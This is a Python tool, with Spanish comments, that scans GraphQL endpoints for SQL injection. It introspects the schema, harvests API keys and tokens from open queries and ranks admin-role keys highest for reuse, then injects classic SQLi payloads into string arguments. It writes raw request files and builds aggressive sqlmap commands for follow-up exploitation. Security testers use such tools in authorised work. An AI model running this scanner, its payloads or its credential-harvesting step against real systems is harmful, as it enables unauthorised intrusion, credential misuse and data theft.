#!/usr/bin/env python3
"""
sqli_detector.py
GraphQL SQL injection mini-detector (Python) - Enhanced version.

Mejoras:
 - Extrae valores de queries simples (sin args) para usarlos como baseline
 - Detecta cuando una query necesita ciertos valores para funcionar
 - Prueba combinaciones de parámetros con valores extraídos del schema
 - Detecta SQLi incluso cuando se requieren API keys u otros parámetros válidos
 - Reduce falsos positivos agregando confirmación antes de reportar un parámetro
   (reporte solo si hay evidencia de error SQL o múltiples indicios de comportamiento anómalo)
"""
from __future__ import annotations
import os
import re
import json
import hashlib
import argparse
from datetime import datetime, timezone
from typing import Any, Dict, List, Optional, Set, Tuple
from urllib.parse import urlparse
from pathlib import Path
from itertools import product

import requests
try:
    from colorama import init as colorama_init, Fore, Style
    colorama_init(autoreset=True)
except Exception:
    class _Dummy:
        def __getattr__(self, name): return ""
    Fore = Style = _Dummy()

INTROSPECTION_QUERY = """
query IntrospectionQuery {
  __schema {
    types {
      kind
      name
      fields {
        name
        args {
          name
          type {
            kind
            name
            ofType {
              kind
              name
              ofType {
                kind
                name
              }
            }
          }
        }
        type {
          kind
          name
          ofType {
            kind
            name
            ofType {
              kind
              name
            }
          }
        }
      }
    }
  }
}
"""

PAYLOADS = [
    '" OR "1"="1',
    "' OR '1'='1",
    "admin' -- ",
    "x' UNION SELECT NULL-- ",
    '"\' OR 1=1 -- ',
    "'",
    "admin'/*",
    'admin"/*',
]

SQL_ERROR_SIGS = [
    re.compile(r"SQL syntax", re.I),
    re.compile(r"syntax error", re.I),
    re.compile(r"unterminated quoted string", re.I),
    re.compile(r"mysql", re.I),
    re.compile(r"postgres", re.I),
    re.compile(r"sqlite", re.I),
    re.compile(r"sqlstate", re.I),
    re.compile(r"you have an error in your sql syntax", re.I),
    re.compile(r"pg_query\(", re.I),
    re.compile(r"pymysql", re.I),
    re.compile(r"psycopg", re.I),
    re.compile(r"mariadb", re.I),
]

TIMEOUT = 20
REPRO_DIR = "repro-payloads"
TRUNCATE_LEN_DEFAULT = 120


def try_parse_headers(h: Optional[str]) -> Dict[str, str]:
    if not h:
        return {}
    try:
        parsed = json.loads(h)
        if isinstance(parsed, dict):
            return parsed
        if isinstance(parsed, list):
            res = {}
            for item in parsed:
                if isinstance(item, dict):
                    res.update(item)
            return res
        print(Fore.YELLOW + "[!] Headers JSON is not an object/dict; trying simple parse.")
    except Exception:
        pass
    headers = {}
    for part in re.split(r";|,", h):
        part = part.strip()
        if not part:
            continue
        if ":" in part:
            k, v = part.split(":", 1)
            headers[k.strip()] = v.strip()
    if headers:
        return headers
    print(Fore.YELLOW + "[!] Failed to parse headers; no additional headers will be used.")
    return {}


def post_graphql(endpoint: str, headers: Dict[str, str], payload: Dict[str, Any]) -> Dict[str, Any]:
    h = {"Content-Type": "application/json"}
    h.update(headers)
    try:
        r = requests.post(endpoint, json=payload, headers=h, timeout=TIMEOUT)
        try:
            data = r.json()
        except Exception:
            data = {"_raw_text": r.text}
        return {"status": r.status_code, "data": data}
    except requests.RequestException as e:
        return {"status": 0, "data": {"errors": [{"message": str(e)}]}}


def extract_named_type(t: Optional[Dict[str, Any]]) -> Optional[str]:
    if not t:
        return None
    if t.get("name"):
        return t.get("name")
    if t.get("ofType"):
        return extract_named_type(t.get("ofType"))
    return None


def is_string_type(arg_type_name: Optional[str]) -> bool:
    if not arg_type_name:
        return False
    n = arg_type_name.lower()
    return n in ("string", "id", "varchar", "text")


def find_type_definition(schema_types: List[Dict[str, Any]], name: Optional[str]) -> Optional[Dict[str, Any]]:
    if not name:
        return None
    for t in schema_types:
        if t.get("name") == name:
            return t
    return None


def pick_scalar_field_for_type(type_def: Optional[Dict[str, Any]], schema_types: List[Dict[str, Any]]) -> Optional[str]:
    if not type_def or not type_def.get("fields"):
        return None
    for f in type_def.get("fields", []):
        tname = extract_named_type(f.get("type"))
        if not tname:
            continue
        low = tname.lower()
        if low in ("string", "int", "float", "boolean", "id", "integer"):
            return f.get("name")
        td = find_type_definition(schema_types, tname)
        if not td or not td.get("fields"):
            return f.get("name")
    return None


def check_sql_error_in_response(resp_data: Dict[str, Any]) -> Optional[Dict[str, str]]:
    if not resp_data:
        return None
    errors = resp_data.get("errors")
    if not errors:
        return None
    for e in errors:
        msg = str(e.get("message", ""))
        for rx in SQL_ERROR_SIGS:
            if rx.search(msg):
                return {"evidence": msg, "pattern": rx.pattern}
    return None


def detect_missing_required_arg(resp_data: Dict[str, Any]) -> Optional[str]:
    if not resp_data:
        return None
    errors = resp_data.get("errors") or []
    for e in errors:
        msg = str(e.get("message", ""))
        m = re.search(r'argument\s+"([^"]+)"[^.]*required but not provided', msg, re.I)
        if m:
            return m.group(1)
    return None


def detect_graphql_syntax_error(resp_data: Dict[str, Any]) -> Optional[str]:
    if not resp_data:
        return None
    errors = resp_data.get("errors") or []
    for e in errors:
        msg = str(e.get("message", ""))
        if re.search(r"Syntax Error GraphQL|Syntax Error|Unexpected character|Expected :, found", msg, re.I):
            return msg
    return None


def normalize_resp(data: Any) -> str:
    try:
        return json.dumps(data, sort_keys=True, ensure_ascii=False)
    except Exception:
        return str(data)


def truncate_str(s: str, n: int = 180) -> str:
    if not s:
        return ""
    return s if len(s) <= n else s[:n] + "..."


def build_query(field_name: str, args_dict: Dict[str, str], selection: Optional[str]) -> Dict[str, Any]:
    args_str = ", ".join([f'{k}: {json.dumps(v)}' for k, v in args_dict.items()])
    if selection:
        q = f'query {{ {field_name}({args_str}) {{ {selection} }} }}'
    else:
        q = f'query {{ {field_name}({args_str}) }}'
    return {"query": q}


def _sanitize_name(s: str) -> str:
    return re.sub(r"[^\w\-]+", "_", s)[:64]


def _write_raw_http(endpoint: str, headers: Dict[str, str], body_json: Dict[str, Any], fname: str) -> str:
    repo_root = Path.cwd()
    repro_dir = repo_root / REPRO_DIR
    repro_dir.mkdir(parents=True, exist_ok=True)
    parsed = urlparse(endpoint)
    path = parsed.path or "/"
    if parsed.query:
        path = path + "?" + parsed.query
    host_header = parsed.netloc
    hdrs = {}
    hdrs["Host"] = host_header
    for k, v in (headers or {}).items():
        if k.lower() == "host":
            hdrs["Host"] = v
        else:
            hdrs[k] = v
    if not any(k.lower() == "content-type" for k in hdrs):
        hdrs["Content-Type"] = "application/json"
    body_str = json.dumps(body_json, ensure_ascii=False)
    fpath = repro_dir / fname
    lines = []
    lines.append(f"POST {path} HTTP/1.1")
    for k, v in hdrs.items():
        lines.append(f"{k}: {v}")
    lines.append("")
    lines.append(body_str)
    content = "\r\n".join(lines) + "\r\n"
    with open(fpath, "w", encoding="utf-8") as fh:
        fh.write(content)
    return str(fpath)


def write_repro_request_file_with_marker(endpoint: str, headers: Dict[str, str], attack_query: str, field: str, arg: str, payload: str) -> str:
    try:
        escaped_payload = json.dumps(payload)
    except Exception:
        escaped_payload = payload
    escaped_marker = json.dumps("*")
    if escaped_payload in attack_query:
        marker_query = attack_query.replace(escaped_payload, escaped_marker, 1)
    elif payload in attack_query:
        marker_query = attack_query.replace(payload, "*", 1)
    else:
        marker_query = attack_query.replace("\\" + payload, escaped_marker, 1)
    ts = datetime.now(timezone.utc).strftime("%Y%m%dT%H%M%SZ")
    short_hash = hashlib.sha1(marker_query.encode("utf-8")).hexdigest()[:8]
    fname = f"{_sanitize_name(field)}_{_sanitize_name(arg)}_{ts}_{short_hash}_marker.http"
    body = {"query": marker_query}
    return _write_raw_http(endpoint, headers, body, fname)


def _build_sqlmap_cmd_marker(repro_marker_path: str) -> str:
    return f"sqlmap --level 5 --risk 3 -r '{repro_marker_path}' -p \"JSON[query]\" --batch --skip-urlencode --parse-errors --random-agent"


def extract_values_from_schema(endpoint: str, headers: Dict[str, str], query_fields: List[Dict[str, Any]], types: List[Dict[str, Any]]) -> Tuple[Dict[str, Set[str]], Dict[str, str]]:
    print(Fore.CYAN + "[*] Extracting potential values from simple queries...")
    extracted_values: Dict[str, Set[str]] = {}
    key_roles: Dict[str, str] = {}
    for field in query_fields:
        args = field.get("args", []) or []
        field_name = field.get("name")
        if not field_name or field_name.startswith("__"):
            continue
        if len(args) > 2:
            continue
        return_type_name = extract_named_type(field.get("type"))
        return_type_def = find_type_definition(types, return_type_name)
        fields_to_select = []
        if return_type_def and return_type_def.get("fields"):
            for f in return_type_def.get("fields", [])[:10]:
                fname = f.get("name")
                if fname and not fname.startswith("__"):
                    fields_to_select.append(fname)
        if not fields_to_select:
            continue
        selection = " ".join(fields_to_select)
        try:
            query = f'query {{ {field_name} {{ {selection} }} }}'
            resp = post_graphql(endpoint, headers, {"query": query})
            if resp.get("data") and isinstance(resp["data"], dict):
                data = resp["data"].get("data", {}).get(field_name)
                if data:
                    if isinstance(data, list):
                        for item in data[:10]:
                            if isinstance(item, dict):
                                item_key = item.get("key") or item.get("apiKey") or item.get("token")
                                item_role = item.get("role")
                                if item_key and item_role:
                                    key_roles[item_key] = item_role
                                for key, value in item.items():
                                    if isinstance(value, str) and value:
                                        extracted_values.setdefault(key, set()).add(value)
                    elif isinstance(data, dict):
                        item_key = data.get("key") or data.get("apiKey") or data.get("token")
                        item_role = data.get("role")
                        if item_key and item_role:
                            key_roles[item_key] = item_role
                        for key, value in data.items():
                            if isinstance(value, str) and value:
                                extracted_values.setdefault(key, set()).add(value)
        except Exception:
            continue
    if extracted_values:
        total_vals = sum(len(v) for v in extracted_values.values())
        print(Fore.GREEN + f"[+] Extracted {total_vals} potential values from {len(extracted_values)} fields")
    if key_roles:
        admin_keys = [k for k, r in key_roles.items() if 'admin' in r.lower()]
        if admin_keys:
            print(Fore.GREEN + Style.BRIGHT + f"[+] Found {len(admin_keys)} admin API key(s) in extracted values")
    return extracted_values, key_roles


def find_matching_values(arg_name: str, extracted_values: Dict[str, Set[str]], key_roles: Dict[str, str]) -> List[str]:
    arg_lower = arg_name.lower()
    candidates = []
    scored_candidates = []
    if arg_name in extracted_values:
        for v in list(extracted_values[arg_name])[:3]:
            score = 100
            if v in key_roles and key_roles[v].lower() in ('admin', 'manager', 'superuser'):
                score += 50
            scored_candidates.append((score, v))
    for key, values in extracted_values.items():
        key_normalized = re.sub(r'[_\-]', '', key.lower())
        arg_normalized = re.sub(r'[_\-]', '', arg_lower)
        if key_normalized in arg_normalized or arg_normalized in key_normalized:
            for v in list(values)[:3]:
                score = 80
                if len(v) > 20:
                    score += 15
                if v in key_roles:
                    role = key_roles[v].lower()
                    if 'admin' in role:
                        score += 100
                    elif 'manager' in role or 'superuser' in role:
                        score += 50
                    elif 'guest' in role or 'user' in role:
                        score -= 20
                if 'key' in arg_lower and 'key' in key.lower():
                    score += 10
                scored_candidates.append((score, v))
        elif 'key' in arg_lower and 'key' in key.lower():
            for v in list(values)[:2]:
                score = 70
                if len(v) > 20:
                    score += 15
                if v in key_roles and 'admin' in key_roles[v].lower():
                    score += 100
                scored_candidates.append((score, v))
        elif 'token' in arg_lower and 'token' in key.lower():
            for v in list(values)[:2]:
                score = 70
                if v in key_roles and 'admin' in key_roles[v].lower():
                    score += 100
                scored_candidates.append((score, v))
        elif 'id' in arg_lower and 'id' in key.lower():
            for v in list(values)[:2]:
                scored_candidates.append((50, v))
        elif 'name' in arg_lower and 'name' in key.lower():
            for v in list(values)[:2]:
                scored_candidates.append((60, v))
    scored_candidates.sort(reverse=True, key=lambda x: x[0])
    seen = set()
    for score, value in scored_candidates:
        if value not in seen:
            candidates.append(value)
            seen.add(value)
            if len(candidates) >= 5:
                break
    return candidates


def run_detector(endpoint: str, headers: Dict[str, str]) -> List[Dict[str, Any]]:
    """
    Ejecuta el detector y devuelve una lista filtrada de hallazgos.
    - Recolectamos todas las señales en temp_findings por parámetro (field,arg)
    - Post-procesamos: reportamos un parámetro SOLO si cumple reglas de confirmación:
        * Tiene al menos un SQL_ERROR_* (error claro en la BD) OR
        * Tiene al menos 2 distintos payloads que producen evidencia (reduce ruido) OR
        * Tiene combinación de señales fuertes (RESPONSE_DIFF + NULL_ON_ATTACK) OR
        * Tiene un NULL_ON_ATTACK confirmado
    Esto ayuda a evitar que campos como 'author' (que pueden devolver null/syntax errors) generen demasiados falsos positivos.
    """
    print(Fore.CYAN + f"[*] Running introspection on {endpoint}")
    intros = post_graphql(endpoint, headers, {"query": INTROSPECTION_QUERY})
    schema = None
    try:
        schema = intros["data"]["data"]["__schema"]
    except Exception:
        print(Fore.RED + "[!] Failed to retrieve schema via introspection. Response:")
        print(json.dumps(intros.get("data", {}), ensure_ascii=False, indent=2))
        return []

    types = schema.get("types", [])
    query_type = next((t for t in types if t.get("name") == "Query"), None)
    if not query_type or not query_type.get("fields"):
        print(Fore.RED + "[!] Query type or fields not found in schema.")
        return []

    query_fields = query_type.get("fields", [])

    extracted_values, key_roles = extract_values_from_schema(endpoint, headers, query_fields, types)

    # temp storage: (field,arg) -> list of finding dicts
    temp_findings: Dict[Tuple[str, str], List[Dict[str, Any]]] = {}

    for field in query_fields:
        args = field.get("args", []) or []
        if not args:
            continue

        field_name = field.get("name")
        if not field_name or field_name.startswith("__"):
            continue

        # Identify string-like args
        string_args = []
        for arg in args:
            arg_type_name = extract_named_type(arg.get("type"))
            if is_string_type(arg_type_name):
                string_args.append(arg)

        if not string_args:
            continue

        return_type_name = extract_named_type(field.get("type"))
        return_type_def = find_type_definition(types, return_type_name)
        selection = pick_scalar_field_for_type(return_type_def, types)
        if not selection and return_type_def and return_type_def.get("fields"):
            fallback = next((f for f in return_type_def["fields"] if f["name"] in ("id", "uuid", "username", "name", "title", "__typename")), None)
            if fallback:
                selection = fallback["name"]
        if not selection:
            selection = "__typename"

        # Prepare base candidate pool for each arg
        base_values: Dict[str, List[str]] = {}
        for arg in args:
            arg_name = arg.get("name")
            arg_type_name = extract_named_type(arg.get("type"))
            matching = find_matching_values(arg_name, extracted_values, key_roles)
            if matching:
                base_values[arg_name] = matching
            elif is_string_type(arg_type_name):
                base_values[arg_name] = ["test", "admin", "test123"]
            else:
                base_values[arg_name] = ["1", "100"]

        for target_arg in string_args:
            target_arg_name = target_arg.get("name")

            # Candidate combinations for other args
            other_args = [a.get("name") for a in args if a.get("name") != target_arg_name]
            candidate_lists = []
            for oname in other_args:
                vals = base_values.get(oname, ["test"])
                vals_sorted = sorted(vals, key=lambda x: len(str(x)), reverse=True)
                candidate_lists.append(vals_sorted[:3] if isinstance(vals_sorted, list) else [str(vals_sorted)])

            combos_to_try: List[Dict[str, str]] = []
            if candidate_lists:
                max_attempts = 6
                seen = 0
                for combo in product(*candidate_lists):
                    args_dict = {}
                    for idx, oname in enumerate(other_args):
                        args_dict[oname] = combo[idx]
                    args_dict[target_arg_name] = "test"
                    combos_to_try.append(args_dict)
                    seen += 1
                    if seen >= max_attempts:
                        break
            else:
                combos_to_try.append({target_arg_name: "test"})

            # find working baseline
            working_args: Optional[Dict[str, str]] = None
            base_norm = None
            base_has_error = True
            base_resp = None
            for attempt_args in combos_to_try:
                base_payload = build_query(field_name, attempt_args, selection)
                base_resp = post_graphql(endpoint, headers, base_payload)
                base_norm = normalize_resp(base_resp.get("data"))
                base_has_error = bool(base_resp.get("data", {}).get("errors"))
                if not base_has_error:
                    working_args = attempt_args.copy()
                    print(Fore.GREEN + Style.DIM + f"[+] Baseline for {field_name}.{target_arg_name} works with args: {attempt_args}")
                    break

            if not working_args:
                working_args = combos_to_try[0].copy() if combos_to_try else {target_arg_name: "test"}
                print(Fore.YELLOW + Style.DIM + f"[!] No clean baseline found for {field_name}.{target_arg_name}, using best-effort baseline: {working_args}")

            # simple baseline for typename comparisons
            simple_q_base = build_query(field_name, {**{k: v for k, v in working_args.items()}, target_arg_name: "test"}, "__typename")
            simple_base_resp = post_graphql(endpoint, headers, simple_q_base)
            simple_base_norm = normalize_resp(simple_base_resp.get("data"))
            simple_field_value = None
            try:
                if isinstance(simple_base_resp.get("data"), dict):
                    simple_field_value = simple_base_resp.get("data", {}).get("data", {}).get(field_name) if simple_base_resp.get("data", {}).get("data") else simple_base_resp.get("data", {}).get(field_name)
            except Exception:
                simple_field_value = None

            # run smart payloads
            for payload in PAYLOADS:
                attack_args = working_args.copy()
                attack_args[target_arg_name] = payload
                attack_payload = build_query(field_name, attack_args, selection)
                attack_resp = post_graphql(endpoint, headers, attack_payload)
                attack_query = attack_payload["query"]

                # skip graphQL syntax errors (not SQLi)
                gql_syntax_msg = detect_graphql_syntax_error(attack_resp.get("data"))
                if gql_syntax_msg:
                    # skip this payload for this param
                    continue

                missing_arg = detect_missing_required_arg(attack_resp.get("data"))
                if missing_arg:
                    if missing_arg not in attack_args or not attack_args.get(missing_arg):
                        candidate = None
                        if base_values.get(missing_arg):
                            candidate = base_values[missing_arg][0]
                        else:
                            matches = find_matching_values(missing_arg, extracted_values, key_roles)
                            if matches:
                                candidate = matches[0]
                        if candidate:
                            attack_args[missing_arg] = candidate
                            attack_payload = build_query(field_name, attack_args, selection)
                            attack_resp = post_graphql(endpoint, headers, attack_payload)
                            attack_query = attack_payload["query"]
                            gql_syntax_msg = detect_graphql_syntax_error(attack_resp.get("data"))
                            if gql_syntax_msg:
                                continue
                        else:
                            # can't fill required arg -> skip this payload
                            continue

                sql_err = check_sql_error_in_response(attack_resp.get("data"))
                attack_norm = normalize_resp(attack_resp.get("data"))

                key = (field_name, target_arg_name)
                temp_findings.setdefault(key, [])

                if sql_err:
                    temp_findings[key].append({
                        "field": field_name,
                        "arg": target_arg_name,
                        "payload": payload,
                        "args_used": attack_args.copy(),
                        "type": "SQL_ERROR_IN_RESPONSE",
                        "evidence": sql_err["evidence"],
                        "base_response": base_resp.get("data") if base_resp else None,
                        "attack_response": attack_resp.get("data"),
                        "recommended_cmd": _build_sqlmap_cmd_marker(write_repro_request_file_with_marker(endpoint, headers, attack_query, field_name, target_arg_name, payload)),
                        "repro": write_repro_request_file_with_marker(endpoint, headers, attack_query, field_name, target_arg_name, payload),
                    })
                    continue

                if base_norm and attack_norm and base_norm != attack_norm and not base_has_error:
                    temp_findings[key].append({
                        "field": field_name,
                        "arg": target_arg_name,
                        "payload": payload,
                        "args_used": attack_args.copy(),
                        "type": "RESPONSE_DIFF",
                        "evidence": "Baseline != Attack",
                        "base_response": base_resp.get("data") if base_resp else None,
                        "attack_response": attack_resp.get("data"),
                        "recommended_cmd": _build_sqlmap_cmd_marker(write_repro_request_file_with_marker(endpoint, headers, attack_query, field_name, target_arg_name, payload)),
                        "repro": write_repro_request_file_with_marker(endpoint, headers, attack_query, field_name, target_arg_name, payload),
                    })
                    continue

                if base_norm and attack_norm and ("null" in attack_norm) and ("null" not in base_norm):
                    temp_findings[key].append({
                        "field": field_name,
                        "arg": target_arg_name,
                        "payload": payload,
                        "args_used": attack_args.copy(),
                        "type": "NULL_ON_ATTACK",
                        "evidence": "Null returned on attack while baseline had data",
                        "base_response": base_resp.get("data") if base_resp else None,
                        "attack_response": attack_resp.get("data"),
                        "recommended_cmd": _build_sqlmap_cmd_marker(write_repro_request_file_with_marker(endpoint, headers, attack_query, field_name, target_arg_name, payload)),
                        "repro": write_repro_request_file_with_marker(endpoint, headers, attack_query, field_name, target_arg_name, payload),
                    })
                    continue

                # simple-response diff (only if simple baseline had meaningful data)
                if simple_field_value not in (None, {}, []) and simple_base_norm and attack_norm and simple_base_norm != attack_norm:
                    temp_findings[key].append({
                        "field": field_name,
                        "arg": target_arg_name,
                        "payload": payload,
                        "args_used": attack_args.copy(),
                        "type": "RESPONSE_DIFF_SIMPLE",
                        "evidence": "Simple baseline __typename differs from attack",
                        "base_response": simple_base_resp.get("data"),
                        "attack_response": attack_resp.get("data"),
                        "recommended_cmd": _build_sqlmap_cmd_marker(write_repro_request_file_with_marker(endpoint, headers, attack_query, field_name, target_arg_name, payload)),
                        "repro": write_repro_request_file_with_marker(endpoint, headers, attack_query, field_name, target_arg_name, payload),
                    })
                    continue

            # SIMPLE fallback: check payloads individually (with required-arg filling & syntax checks)
            for payload in PAYLOADS:
                simple_attack_q = build_query(field_name, {target_arg_name: payload}, "__typename")
                simple_atk_resp = post_graphql(endpoint, headers, simple_attack_q)

                missing_arg = detect_missing_required_arg(simple_atk_resp.get("data"))
                if missing_arg:
                    candidate = None
                    if base_values.get(missing_arg):
                        candidate = base_values[missing_arg][0]
                    else:
                        matches = find_matching_values(missing_arg, extracted_values, key_roles)
                        if matches:
                            candidate = matches[0]
                    if candidate:
                        simple_attack_q = build_query(field_name, {target_arg_name: payload, missing_arg: candidate}, "__typename")
                        simple_atk_resp = post_graphql(endpoint, headers, simple_attack_q)
                    else:
                        continue

                gql_syntax_msg = detect_graphql_syntax_error(simple_atk_resp.get("data"))
                if gql_syntax_msg:
                    continue

                sa_norm = normalize_resp(simple_atk_resp.get("data"))
                sa_err = check_sql_error_in_response(simple_atk_resp.get("data"))

                key = (field_name, target_arg_name)
                temp_findings.setdefault(key, [])

                if sa_err:
                    temp_findings[key].append({
                        "field": field_name,
                        "arg": target_arg_name,
                        "payload": payload,
                        "args_used": {target_arg_name: payload},
                        "type": "SQL_ERROR_IN_RESPONSE_SIMPLE",
                        "evidence": sa_err["evidence"],
                        "base_response": simple_base_resp.get("data"),
                        "attack_response": simple_atk_resp.get("data"),
                        "recommended_cmd": _build_sqlmap_cmd_marker(write_repro_request_file_with_marker(endpoint, headers, simple_attack_q["query"], field_name, target_arg_name, payload)),
                        "repro": write_repro_request_file_with_marker(endpoint, headers, simple_attack_q["query"], field_name, target_arg_name, payload),
                    })
                    break

                if simple_field_value not in (None, {}, []) and simple_base_norm and sa_norm and simple_base_norm != sa_norm:
                    temp_findings[key].append({
                        "field": field_name,
                        "arg": target_arg_name,
                        "payload": payload,
                        "args_used": {target_arg_name: payload},
                        "type": "RESPONSE_DIFF_SIMPLE",
                        "evidence": "Simple baseline __typename differs from attack",
                        "base_response": simple_base_resp.get("data"),
                        "attack_response": simple_atk_resp.get("data"),
                        "recommended_cmd": _build_sqlmap_cmd_marker(write_repro_request_file_with_marker(endpoint, headers, simple_attack_q["query"], field_name, target_arg_name, payload)),
                        "repro": write_repro_request_file_with_marker(endpoint, headers, simple_attack_q["query"], field_name, target_arg_name, payload),
                    })
                    break

    # Post-process temp_findings to reduce false positives
    final_findings: List[Dict[str, Any]] = []
    for (field_name, arg_name), items in temp_findings.items():
        # Early suppression: if all attack responses are null/empty and there is no SQL_ERROR, skip reporting
        all_attack_null = True
        for it in items:
            atk = it.get("attack_response")
            if isinstance(atk, dict):
                # extract field value if possible
                val = None
                try:
                    if isinstance(atk.get("data"), dict):
                        val = atk.get("data", {}).get(field_name)
                    else:
                        val = atk.get(field_name)
                except Exception:
                    val = None
                if val not in (None, {}, []):
                    all_attack_null = False
                    break
            else:
                # non-dict attack response (text/error) -> treat as non-null evidence
                all_attack_null = False
                break
        if all_attack_null and not any(i.get("type", "").startswith("SQL_ERROR") for i in items):
            print(Fore.BLUE + Style.DIM + f"[-] Suppressing {field_name}.{arg_name}: all attack responses were null/empty and no SQL error found.")
            continue

        types_present = set(i.get("type") for i in items)
        payloads_present = set(i.get("payload") for i in items)
        has_sql_err = any(i.get("type", "").startswith("SQL_ERROR") for i in items)
        has_null_on_attack = any(i.get("type") == "NULL_ON_ATTACK" for i in items)

        # Confirm rule: report if SQL error OR multiple distinct payloads produced signals OR strong combination
        if has_sql_err:
            for i in items:
                if i.get("type", "").startswith("SQL_ERROR"):
                    final_findings.append(i)
            continue

        if len(payloads_present) >= 2:
            seen_payloads = set()
            for i in items:
                p = i.get("payload")
                if p not in seen_payloads:
                    final_findings.append(i)
                    seen_payloads.add(p)
            continue

        if has_null_on_attack:
            for i in items:
                if i.get("type") == "NULL_ON_ATTACK":
                    final_findings.append(i)
            continue

        if "RESPONSE_DIFF" in types_present and "RESPONSE_DIFF_SIMPLE" in types_present:
            rep = next((i for i in items if i.get("type") in ("RESPONSE_DIFF", "RESPONSE_DIFF_SIMPLE")), None)
            if rep:
                final_findings.append(rep)
            continue

        # otherwise ignore (likely false positive)
        print(Fore.BLUE + Style.DIM + f"[-] Suppressed probable false positive for {field_name}.{arg_name} (signals: {sorted(types_present)})")

    return final_findings


def print_findings_short(findings: List[Dict[str, Any]], truncate_len: int):
    if not findings:
        print(Fore.GREEN + "[*] No obvious SQLi indications were found using the configured payloads.")
        return

    print(Fore.RED + Style.BRIGHT + f"\n[!] Found {len(findings)} potential SQL injection findings:\n")

    for i, f in enumerate(findings, 1):
        print(Fore.RED + Style.BRIGHT + f"[{i}] {f.get('type')}: " + Style.RESET_ALL + f"{f.get('field')}.{f.get('arg')}")
        if f.get('args_used'):
            print(Fore.YELLOW + "    Arguments used:" + Style.RESET_ALL + f" {f.get('args_used')}")
        ev = f.get('evidence') or ''
        print(Fore.YELLOW + "    Evidence:" + Style.RESET_ALL + f" {truncate_str(str(ev), truncate_len)}")
        if f.get('repro'):
            print(Fore.CYAN + "    Marker request:" + Style.RESET_ALL + f" {f.get('repro')}")
            print(Fore.CYAN + "    Recommended sqlmap command:" + Style.RESET_ALL)
            print(Fore.WHITE + Style.DIM + f"    {f.get('recommended_cmd')}")
        print(Style.DIM + "-" * 80 + Style.RESET_ALL)


def main():
    parser = argparse.ArgumentParser(description="GraphQL SQLi mini-detector (Enhanced - extracts values from schema)")
    parser.add_argument("endpoint", help="GraphQL endpoint URL")
    parser.add_argument("headers", nargs="?", help="Optional headers JSON", default=None)
    args = parser.parse_args()

    headers = try_parse_headers(args.headers)
    findings = run_detector(args.endpoint, headers)
    print_findings_short(findings, TRUNCATE_LEN_DEFAULT)


if __name__ == "__main__":
    main()
